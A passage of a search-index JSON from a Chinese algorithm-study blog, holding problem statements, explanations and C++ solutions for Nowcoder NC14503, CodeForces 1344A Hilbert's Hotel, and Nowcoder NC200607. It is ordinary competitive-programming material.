Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/7.%E7%89%9B%E5%AE%A2%E7%BD%91_NC14503_%E6%99%A8%E8%B7%91/#15-sample-input","text":"2 3 5","title":"1.5. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/7.%E7%89%9B%E5%AE%A2%E7%BD%91_NC14503_%E6%99%A8%E8%B7%91/#16-sample-output","text":"30","title":"1.6. Sample Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/7.%E7%89%9B%E5%AE%A2%E7%BD%91_NC14503_%E6%99%A8%E8%B7%91/#17-source","text":"\u725b\u5ba2\u7f51 NC14503 \u6668\u8dd1","title":"1.7. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/7.%E7%89%9B%E5%AE%A2%E7%BD%91_NC14503_%E6%99%A8%E8%B7%91/#2","text":"\u8ba1\u7b97\u4e09\u4e2a\u6570\u7684\u6700\u5c0f\u516c\u500d\u6570\u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/7.%E7%89%9B%E5%AE%A2%E7%BD%91_NC14503_%E6%99%A8%E8%B7%91/#3","text":"#include <iostream> using namespace std; // \u6c42\u6700\u5927\u516c\u7ea6\u6570 long long gcd(long long a, long long b) { return b == 0 ? a : gcd(b, a % b); } int main() { // test case long long a, b, c; scanf(\"%lld %lld %lld\", &a, &b, &c); // \u8ba1\u7b97\u6700\u5c0f\u516c\u500d\u6570 long long lcmNum = a * b / gcd(a, b); // \u8ba1\u7b97\u4e09\u4e2a\u6570\u7684\u6700\u5c0f\u516c\u500d\u6570 long long ans = lcmNum * c / gcd(lcmNum, c); // \u8f93\u51fa printf(\"%lld\", ans); } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/8.CodeForces_1344_A_Hilbert%27s_Hotel/","text":"CodeForces 1344 A Hilbert's Hotel # \u76ee\u5f55 # CodeForces 1344 A Hilbert's Hotel \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Notes 1.8. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 1000 ms Memory Limit: 256 MB 1.2. Problem Description # Hilbert's Hotel is a very unusual hotel since the number of rooms is infinite! In fact, there is exactly one room for every integer, including zero and negative integers. Even stranger, the hotel is currently at full capacity, meaning there is exactly one guest in every room. The hotel's manager, David Hilbert himself, decides he wants to shuffle the guests around because he thinks this will create a vacancy (a room without a guest). For any integer k and positive integer n , let k \\mod n denote the remainder when k is divided by n . More formally, r=k \\mod n is the smallest non-negative integer suchthat k\u2212r is divisible by n . It always holds that 0 \\le k \\mod n \\le n\u22121 . For example, 100 \\mod 12 = 4 and (\u22121337) \\mod 3 = 1 . Then the shuffling works as follows. There isan array of n integers a_0,a_1,\\dots,a_{n\u22121} . Then for each integer k , the guest in room k is moved to room number k+a_k \\mod n . After this shuffling process, determine if there is still exactly one guest assigned to each room. That is, there are no vacancies or rooms with multiple guests. 1.3. Input # Each test consists of multiple test cases. The first line contains a single integer t(1 \\le t \\le 10^4) \u2014 the number of test cases. Next 2t lines contain descriptions of test cases.The first line of each test case contains a single integer (1\\le n \\le2 \\cdot 10^5) \u2014 the length of the array. The second line of each test case contains \ud835\udc5bn integers a_0,a_1,\\dots,a_{n-1} (\u221210^9 \\le a_i \\le 10^9) . It is guaranteed that the sum of n over all test cases does not exceed 2 \\cdot 10^5 . 1.4. Output # For each test case, output a single line containing \"YES\" if there is exactly one guest assigned to each room after the shuffling process, or \"NO\" otherwise. You can print each letter in any case (upper or lower). 1.5. Sample Input # 6 1 14 2 1 -1 4 5 5 5 1 3 3 2 1 2 0 1 5 -239 -2 -100 -3 -11 1.6. Sample Output # YES YES YES NO NO YES 1.7. Notes # In the first test case, every guest is shifted by 14 rooms, so the assignment is still unique. In the second test case, even guests move to the right by 1 room, and odd guests move to the left by 1 room. We can show that the assignment is still unique. In the third test case, every fourth guest moves to the right by 1 room, and the other guests move to the right by 5 rooms. We can show that the assignment is still unique. In the fourth test case, guests 0 and 1 are both assigned to room 3 . In the fifth test case, guests 1 and 2 are both assigned to room 2 . 1.8. Source # CodeForces 1344 A Hilbert's Hotel 2. \u89e3\u8bfb # \u8ba1\u7b97 ((a_n + n) \\%n + n ) \\% n \uff0c n \\in [0, n - 1] \uff0c\u5224\u65ad\u5176\u7ed3\u679c\u662f\u5426\u6709\u91cd\u590d\uff0c\u7528 set \u5b58\u50a8\u540e\uff0c\u6bd4\u8f83 set.size() \u548c n \u7684\u5927\u5c0f\u5373\u53ef\u3002 \u56e0\u4e3a a_i \u7684\u8303\u56f4\u4e3a (\u221210^9 \\le a_i \\le 10^9) \u3002 a_n + n \u4e3a\u6b63\u6570\u65f6\uff0c\u7ed3\u679c\u4e3a (a_n + n)\\%n \u3002 a_n + n \u4e3a\u8d1f\u6570\u65f6\uff0c\u7ed3\u679c\u4e3a n + (n + a_n)\\%n \u3002 \u5c06\u6b63\u8d1f\u6570\u7684\u60c5\u51b5\u7edf\u4e00\u8d77\u6765\uff0c\u7ed3\u679c\u4e3a ((a_n + n) \\%n + n ) \\% n \u3002 3. \u4ee3\u7801 # #include <iostream> #include <set> #include <string.h> using namespace std; // \u96c6\u5408\u5b58\u50a8 set<long long> st; int main() { // test case int t; // \u4e2a\u6570 long long n; long long buffer; scanf(\"%d\", &t); // test case for (int i = 0; i < t; i++) { scanf(\"%lld\", &n); // \u521d\u59cb\u5316 st.clear(); // \u8f93\u5165 for (long long j = 0; j < n; j++) { scanf(\"%lld\", &buffer); st.insert(((j + buffer) % n + n) % n); } printf(\"%s\\n\", (long long)st.size() == n ? \"YES\" : \"NO\"); } } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"8.CodeForces 1344 A Hilbert's Hotel"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/8.CodeForces_1344_A_Hilbert%27s_Hotel/#codeforces-1344-a-hilberts-hotel","text":"","title":"CodeForces 1344 A Hilbert's Hotel"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/8.CodeForces_1344_A_Hilbert%27s_Hotel/#_1","text":"CodeForces 1344 A Hilbert's Hotel \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Notes 1.8. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/8.CodeForces_1344_A_Hilbert%27s_Hotel/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/8.CodeForces_1344_A_Hilbert%27s_Hotel/#11-limit","text":"Time Limit: 1000 ms Memory Limit: 256 MB","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/8.CodeForces_1344_A_Hilbert%27s_Hotel/#12-problem-description","text":"Hilbert's Hotel is a very unusual hotel since the number of rooms is infinite! In fact, there is exactly one room for every integer, including zero and negative integers. Even stranger, the hotel is currently at full capacity, meaning there is exactly one guest in every room. The hotel's manager, David Hilbert himself, decides he wants to shuffle the guests around because he thinks this will create a vacancy (a room without a guest). For any integer k and positive integer n , let k \\mod n denote the remainder when k is divided by n . More formally, r=k \\mod n is the smallest non-negative integer suchthat k\u2212r is divisible by n . It always holds that 0 \\le k \\mod n \\le n\u22121 . For example, 100 \\mod 12 = 4 and (\u22121337) \\mod 3 = 1 . Then the shuffling works as follows. There isan array of n integers a_0,a_1,\\dots,a_{n\u22121} . Then for each integer k , the guest in room k is moved to room number k+a_k \\mod n . After this shuffling process, determine if there is still exactly one guest assigned to each room. That is, there are no vacancies or rooms with multiple guests.","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/8.CodeForces_1344_A_Hilbert%27s_Hotel/#13-input","text":"Each test consists of multiple test cases. The first line contains a single integer t(1 \\le t \\le 10^4) \u2014 the number of test cases. Next 2t lines contain descriptions of test cases.The first line of each test case contains a single integer (1\\le n \\le2 \\cdot 10^5) \u2014 the length of the array. The second line of each test case contains \ud835\udc5bn integers a_0,a_1,\\dots,a_{n-1} (\u221210^9 \\le a_i \\le 10^9) . It is guaranteed that the sum of n over all test cases does not exceed 2 \\cdot 10^5 .","title":"1.3. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/8.CodeForces_1344_A_Hilbert%27s_Hotel/#14-output","text":"For each test case, output a single line containing \"YES\" if there is exactly one guest assigned to each room after the shuffling process, or \"NO\" otherwise. You can print each letter in any case (upper or lower).","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/8.CodeForces_1344_A_Hilbert%27s_Hotel/#15-sample-input","text":"6 1 14 2 1 -1 4 5 5 5 1 3 3 2 1 2 0 1 5 -239 -2 -100 -3 -11","title":"1.5. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/8.CodeForces_1344_A_Hilbert%27s_Hotel/#16-sample-output","text":"YES YES YES NO NO YES","title":"1.6. Sample Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/8.CodeForces_1344_A_Hilbert%27s_Hotel/#17-notes","text":"In the first test case, every guest is shifted by 14 rooms, so the assignment is still unique. In the second test case, even guests move to the right by 1 room, and odd guests move to the left by 1 room. We can show that the assignment is still unique. In the third test case, every fourth guest moves to the right by 1 room, and the other guests move to the right by 5 rooms. We can show that the assignment is still unique. In the fourth test case, guests 0 and 1 are both assigned to room 3 . In the fifth test case, guests 1 and 2 are both assigned to room 2 .","title":"1.7. Notes"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/8.CodeForces_1344_A_Hilbert%27s_Hotel/#18-source","text":"CodeForces 1344 A Hilbert's Hotel","title":"1.8. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/8.CodeForces_1344_A_Hilbert%27s_Hotel/#2","text":"\u8ba1\u7b97 ((a_n + n) \\%n + n ) \\% n \uff0c n \\in [0, n - 1] \uff0c\u5224\u65ad\u5176\u7ed3\u679c\u662f\u5426\u6709\u91cd\u590d\uff0c\u7528 set \u5b58\u50a8\u540e\uff0c\u6bd4\u8f83 set.size() \u548c n \u7684\u5927\u5c0f\u5373\u53ef\u3002 \u56e0\u4e3a a_i \u7684\u8303\u56f4\u4e3a (\u221210^9 \\le a_i \\le 10^9) \u3002 a_n + n \u4e3a\u6b63\u6570\u65f6\uff0c\u7ed3\u679c\u4e3a (a_n + n)\\%n \u3002 a_n + n \u4e3a\u8d1f\u6570\u65f6\uff0c\u7ed3\u679c\u4e3a n + (n + a_n)\\%n \u3002 \u5c06\u6b63\u8d1f\u6570\u7684\u60c5\u51b5\u7edf\u4e00\u8d77\u6765\uff0c\u7ed3\u679c\u4e3a ((a_n + n) \\%n + n ) \\% n \u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/8.CodeForces_1344_A_Hilbert%27s_Hotel/#3","text":"#include <iostream> #include <set> #include <string.h> using namespace std; // \u96c6\u5408\u5b58\u50a8 set<long long> st; int main() { // test case int t; // \u4e2a\u6570 long long n; long long buffer; scanf(\"%d\", &t); // test case for (int i = 0; i < t; i++) { scanf(\"%lld\", &n); // \u521d\u59cb\u5316 st.clear(); // \u8f93\u5165 for (long long j = 0; j < n; j++) { scanf(\"%lld\", &buffer); st.insert(((j + buffer) % n + n) % n); } printf(\"%s\\n\", (long long)st.size() == n ? \"YES\" : \"NO\"); } } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/9.%E7%89%9B%E5%AE%A2%E7%BD%91_NC200607_A-%E8%A7%A3%E9%94%81%E4%B8%93%E5%AE%B6/","text":"\u725b\u5ba2\u7f51 NC200607 A-\u89e3\u9501\u4e13\u5bb6 # \u76ee\u5f55 # \u725b\u5ba2\u7f51 NC200607 A-\u89e3\u9501\u4e13\u5bb6 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Notes 1.8. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 1000 ms Memory Limit: 262144 kB 1.2. Problem Description # \u963f\u70b3\u662f\u4e00\u4e2a\u7cbe\u901a\u6587\u7406\u7684\u5c0f\u673a\u7075\u9b3c\uff0c\u5b83\u662f\u4e00\u4e2a\u89e3\u9501\u4e13\u5bb6\uff0c\u4e5f\u662f\u4e00\u4e2a\u8bd7\u4eba\u3002\u4e00\u5929\uff0c\u963f\u70b3\u53d7\u9080\u524d\u5f80\u9ec4\u53f0\u752b\u9a6c\u54c8\u90a3\u5764\u5f03\u4ed6\u54c7\u52b3\u72c4\u5e0c\u963f\u7531\u4ed6\u4e9a\u9a6c\u54c8\u5e95\u9646\u6d66\u6b27\u53fb\u8fa3\u5854\u5c3c\u5e03\u9ece\u9686\u4e4c\u51ac\u5e15\u62c9\u67e5\u5c3c\u536b\u9a6c\u54c8\u6d12\u5766,\u4e5f\u5c31\u662f\u4eca\u5929\u4fd7\u79f0\u7684\u66fc\u8c37\uff0c\u89e3\u4e00\u4e2a\u88ab\u6587\u5b57\u9501\u9501\u4f4f\u7684\u5b9d\u7bb1\u3002 \u6587\u5b57\u9501\u662f\u8fd9\u6837\u63cf\u8ff0\u7684\uff0c\u5bf9\u4e8e\u7ed9\u5b9a\u7684\u4e00\u4e2a n \uff0c\u95ee\u5b58\u5728\u591a\u5c11\u6b63\u6574\u6570x\u6ee1\u8db3\uff1a x>0 \uff1b x \u4e8c\u8fdb\u5236\u4f4d\u7684\u4f4d\u6570\u4e0d\u8d85\u8fc7 n \uff0c\u4f8b\u5982 5=101(2) \uff0c\u5b83\u7684\u4e8c\u8fdb\u5236\u4f4d\u7684\u4f4d\u6570\u5c31\u662f 3 \uff1b x \u7684\u4e8c\u8fdb\u5236\u5f62\u5f0f\uff0c\u4e0d\u5b58\u5728\u8fde\u7eed\u7684\u4e24\u4e2a\u4e8c\u8fdb\u5236\u4f4d\u4e0a\u7684\u6570\u90fd\u662f 1\u3002\u4f8b\u5982 3=11(2) \uff0c\u5219\u4e0d\u6ee1\u8db3\u6761\u4ef6\uff0c\u4f46\u662f 5=101(2) \u5219\u6ee1\u8db3\u6761\u4ef6\u3002 \u963f\u70b3\u601d\u8003\u4e865\u5206\u949f\u540e\uff0c\u671b\u7740\u5c71\u4e0b\u7684\u7f8e\u666f\uff0c\u4e0d\u7981\u5199\u8d77\u4e86\u8bd7\uff1a \u98de\u82b1\u4e24\u5cb8\u7167\u8239\u7ea2\uff0c \u6ce2\u5149\u5c71\u8272\u4e24\u76c8\u76c8\u3002 \u90a3\u5e74\u79c1\u8bed\u5c0f\u7a97\u8fb9\uff0c \u59be\u5fc3\u964c\u4e0a\u60a0\u626c\u8776\u3002 \u539f\u6765\u963f\u70b3\u4e0d\u4f1a\u89e3\uff0c\u4e3a\u4e86\u63a9\u9970\u5c34\u5c2c\uff0c\u53ea\u597d\u4f5c\u8bd7\u7f13\u89e3\u4e00\u4e9b\u5c34\u5c2c\u7684\u6c14\u6c1b\uff0c\u963f\u70b3\u4f5c\u4e3a\u4e00\u4e2a\u77e5\u540d\u89e3\u9501\u4e13\u5bb6\uff0c\u5f53\u7136\u662f\u8981\u9762\u5b50\u7684\u561b\uff0c\u6240\u4ee5\uff0c\u963f\u70b3\u8bf7\u4f60\u5e2e\u5e2e\u4ed6\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002 1.3. Input # \u591a\u6d4b\u8bd5\u6570\u636e\u6837\u4f8b\uff0c\u6d4b\u8bd5\u6837\u4f8b\u7ec4\u6570\u4e0d\u8d85\u8fc710000\u3002 \u6bcf\u7ec4\u6570\u636e\u4e00\u884c\uff0c\u4e00\u4e2a\u6570 n\uff081 \\le n \\le 100\uff09 \u3002 1.4. Output # \u6bcf\u7ec4\u6570\u636e\u8f93\u51fa\u4e00\u4e2a\u6570\uff0c\u6ee1\u8db3\u6761\u4ef6\u7684\u6b63\u6574\u6570 x \u7684\u4e2a\u6570\u53d6\u6a21 433494437\uff08\u5373\u7b54\u6848\u9700\u8981 %433494437\uff09 1.5. Sample Input # 1 3 1.6. Sample Output # 1 4 1.7. Notes # \u5f53 n=1 \u65f6\uff0c\u53ea\u6709 x=1 \u6ee1\u8db3\u6761\u4ef6\u3002 \u5f53 n=3 \u65f6\uff0c\u6709 x=1(001), x=2(010), x=4(100), x=5(101) \u51714\u79cd\u60c5\u51b5\u3002 1.8. Source # \u725b\u5ba2\u7f51 NC200607 A-\u89e3\u9501\u4e13\u5bb6 2. \u89e3\u8bfb # \u5c06\u524d\u51e0\u4e2a\u6570\u5b57\u5217\u51fa\u6765\uff0c\u548c\u6590\u6ce2\u90a3\u5951\u6570\u5217\u4e00\u5bf9\u6bd4\uff0c\u4f1a\u53d1\u73b0\u8fd9\u5c31\u662f\u6590\u6ce2\u90a3\u5951\u6570\u5217\u7684\u53d8\u5f62\u3002\u9012\u63a8\u65b9\u7a0b\u4e3a f(n) = f(n-1) + f(n-2) + 1 \uff0c\u521d\u59cb\u6761\u4ef6\u4e3a f(0) = 0 \uff0c f(1) = 1 \u3002 \\text{Table 1. \u6837\u4f8b\u6570\u636e\u5206\u6790} n \u4e8c\u8fdb\u5236\u6570\u4f4d \u7ed3\u679c \u6590\u6ce2\u90a3\u5951 1 (0)_B 1 1 2 (00)_B 2 1 3 (000)_B 4 3 4 (0000)_B 7 5 5 (00000)_B 12 8 6 (000000)_B 20 13 7 (0000000)_B 33 21 8 (00000000)_B 54 34 3. \u4ee3\u7801 # #include<iostream> #include<algorithm> const long long num = 1e2 + 1; using namespace std; long long list[num]; // \u901a\u8fc7\u9012\u63a8\u65b9\u7a0b\u8fdb\u884c\u8ba1\u7b97 void calculate(int n){ list[0] = 0; list[1] = 1; for(int i = 2; i <= n; i++){ list[i] = (list[i-1] + list[i-2] + 1)% 433494437; } } int main(){ long long n; long long ans = 0; calculate(num-1); // \u8f93\u5165 while(scanf(\"%lld\", &n) != EOF){ ans = list[n]; printf(\"%lld\\n\", ans); } } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"9.\u725b\u5ba2\u7f51 NC200607 A \u89e3\u9501\u4e13\u5bb6"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/9.%E7%89%9B%E5%AE%A2%E7%BD%91_NC200607_A-%E8%A7%A3%E9%94%81%E4%B8%93%E5%AE%B6/#nc200607-a-","text":"","title":"\u725b\u5ba2\u7f51 NC200607 A-\u89e3\u9501\u4e13\u5bb6"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/9.%E7%89%9B%E5%AE%A2%E7%BD%91_NC200607_A-%E8%A7%A3%E9%94%81%E4%B8%93%E5%AE%B6/#_1","text":"\u725b\u5ba2\u7f51 NC200607 A-\u89e3\u9501\u4e13\u5bb6 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Notes 1.8. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/9.%E7%89%9B%E5%AE%A2%E7%BD%91_NC200607_A-%E8%A7%A3%E9%94%81%E4%B8%93%E5%AE%B6/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/9.%E7%89%9B%E5%AE%A2%E7%BD%91_NC200607_A-%E8%A7%A3%E9%94%81%E4%B8%93%E5%AE%B6/#11-limit","text":"Time Limit: 1000 ms Memory Limit: 262144 kB","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/9.%E7%89%9B%E5%AE%A2%E7%BD%91_NC200607_A-%E8%A7%A3%E9%94%81%E4%B8%93%E5%AE%B6/#12-problem-description","text":"\u963f\u70b3\u662f\u4e00\u4e2a\u7cbe\u901a\u6587\u7406\u7684\u5c0f\u673a\u7075\u9b3c\uff0c\u5b83\u662f\u4e00\u4e2a\u89e3\u9501\u4e13\u5bb6\uff0c\u4e5f\u662f\u4e00\u4e2a\u8bd7\u4eba\u3002\u4e00\u5929\uff0c\u963f\u70b3\u53d7\u9080\u524d\u5f80\u9ec4\u53f0\u752b\u9a6c\u54c8\u90a3\u5764\u5f03\u4ed6\u54c7\u52b3\u72c4\u5e0c\u963f\u7531\u4ed6\u4e9a\u9a6c\u54c8\u5e95\u9646\u6d66\u6b27\u53fb\u8fa3\u5854\u5c3c\u5e03\u9ece\u9686\u4e4c\u51ac\u5e15\u62c9\u67e5\u5c3c\u536b\u9a6c\u54c8\u6d12\u5766,\u4e5f\u5c31\u662f\u4eca\u5929\u4fd7\u79f0\u7684\u66fc\u8c37\uff0c\u89e3\u4e00\u4e2a\u88ab\u6587\u5b57\u9501\u9501\u4f4f\u7684\u5b9d\u7bb1\u3002 \u6587\u5b57\u9501\u662f\u8fd9\u6837\u63cf\u8ff0\u7684\uff0c\u5bf9\u4e8e\u7ed9\u5b9a\u7684\u4e00\u4e2a n \uff0c\u95ee\u5b58\u5728\u591a\u5c11\u6b63\u6574\u6570x\u6ee1\u8db3\uff1a x>0 \uff1b x \u4e8c\u8fdb\u5236\u4f4d\u7684\u4f4d\u6570\u4e0d\u8d85\u8fc7 n \uff0c\u4f8b\u5982 5=101(2) \uff0c\u5b83\u7684\u4e8c\u8fdb\u5236\u4f4d\u7684\u4f4d\u6570\u5c31\u662f 3 \uff1b x \u7684\u4e8c\u8fdb\u5236\u5f62\u5f0f\uff0c\u4e0d\u5b58\u5728\u8fde\u7eed\u7684\u4e24\u4e2a\u4e8c\u8fdb\u5236\u4f4d\u4e0a\u7684\u6570\u90fd\u662f 1\u3002\u4f8b\u5982 3=11(2) \uff0c\u5219\u4e0d\u6ee1\u8db3\u6761\u4ef6\uff0c\u4f46\u662f 5=101(2) \u5219\u6ee1\u8db3\u6761\u4ef6\u3002 \u963f\u70b3\u601d\u8003\u4e865\u5206\u949f\u540e\uff0c\u671b\u7740\u5c71\u4e0b\u7684\u7f8e\u666f\uff0c\u4e0d\u7981\u5199\u8d77\u4e86\u8bd7\uff1a \u98de\u82b1\u4e24\u5cb8\u7167\u8239\u7ea2\uff0c \u6ce2\u5149\u5c71\u8272\u4e24\u76c8\u76c8\u3002 \u90a3\u5e74\u79c1\u8bed\u5c0f\u7a97\u8fb9\uff0c \u59be\u5fc3\u964c\u4e0a\u60a0\u626c\u8776\u3002 \u539f\u6765\u963f\u70b3\u4e0d\u4f1a\u89e3\uff0c\u4e3a\u4e86\u63a9\u9970\u5c34\u5c2c\uff0c\u53ea\u597d\u4f5c\u8bd7\u7f13\u89e3\u4e00\u4e9b\u5c34\u5c2c\u7684\u6c14\u6c1b\uff0c\u963f\u70b3\u4f5c\u4e3a\u4e00\u4e2a\u77e5\u540d\u89e3\u9501\u4e13\u5bb6\uff0c\u5f53\u7136\u662f\u8981\u9762\u5b50\u7684\u561b\uff0c\u6240\u4ee5\uff0c\u963f\u70b3\u8bf7\u4f60\u5e2e\u5e2e\u4ed6\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/9.%E7%89%9B%E5%AE%A2%E7%BD%91_NC200607_A-%E8%A7%A3%E9%94%81%E4%B8%93%E5%AE%B6/#13-input","text":"\u591a\u6d4b\u8bd5\u6570\u636e\u6837\u4f8b\uff0c\u6d4b\u8bd5\u6837\u4f8b\u7ec4\u6570\u4e0d\u8d85\u8fc710000\u3002 \u6bcf\u7ec4\u6570\u636e\u4e00\u884c\uff0c\u4e00\u4e2a\u6570 n\uff081 \\le n \\le 100\uff09 \u3002","title":"1.3. 